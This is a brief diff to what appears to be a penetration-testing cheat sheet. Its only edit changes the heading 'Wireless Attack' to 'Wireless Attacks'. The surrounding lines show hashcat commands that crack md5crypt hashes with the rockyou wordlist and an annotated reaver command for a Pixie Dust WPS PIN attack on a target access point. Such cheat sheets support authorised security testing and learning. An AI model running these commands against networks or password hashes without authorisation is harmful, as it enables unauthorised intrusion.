@@ -230,7 +230,7 @@ hashcat -m 500 hash rockyou.txt
 hashcat -m 500 -a0 --force 'tmp' '/usr/share/wordlists/rockyou.txt'	
 ```
 
-# Wireless Attack
+# Wireless Attacks
 ## WPS Pin Recovery
 ```
 reaver -i wlan0mon -b 9C:AD...(network-target-mac) -c 1 (channel 1) -f (fixed:one channel) -a -w(win7 register art) -v (verbose) -K 1 (Pixie-attack: hit common pins)
